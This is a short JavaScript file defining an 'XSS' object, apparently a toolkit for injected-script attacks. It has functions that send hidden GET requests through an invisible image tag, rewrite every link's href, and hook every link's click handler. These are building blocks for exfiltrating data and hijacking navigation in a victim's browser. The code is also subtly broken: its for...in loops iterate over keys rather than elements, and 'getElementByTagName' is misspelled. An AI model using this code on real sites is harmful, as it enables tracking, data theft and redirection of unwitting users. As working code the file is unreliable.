var XSS = {
  imgTag: null,

  /*
   * Triggers a GET request to the given URL.
   *
   * @param {String} url
   *   The URL to request.
   */
  get: function(url) {
    if (XSS.imgTag == null)
    {
      XSS.imgTag = document.createElement('img');
      XSS.imgTag.setAttribute('style', 'display: none;');
    }

    XSS.imgTag.setAttribute('src',url);
  },

  /*
   * Rewrites the href attributes for all anchor links in the document.
   *
   * @param {function(href)} callback
   *   The callback to rewrite the hrefs of the links.
   */
  rewriteLinks: function(callback) {
    var links = document.getElementsByTagName('a');

    for (link in links)
    {
      if (link.hasAttribute('href'))
      {
        link.setAttribute('href',callback(link.getAttribute('href')));
      }
    }
  },

  /*
   * Hooks the click event for all anchor links in the document.
   *
   * @param {function} callback
   *   The click event callback.
   */
  hookLinks: function(callback) {
    var links = document.getElementByTagName('a');

    for (link in links)
    {
      if (link.hasAttribute('href'))
      {
        link.onclick = callback;
      }
    }
  }
};
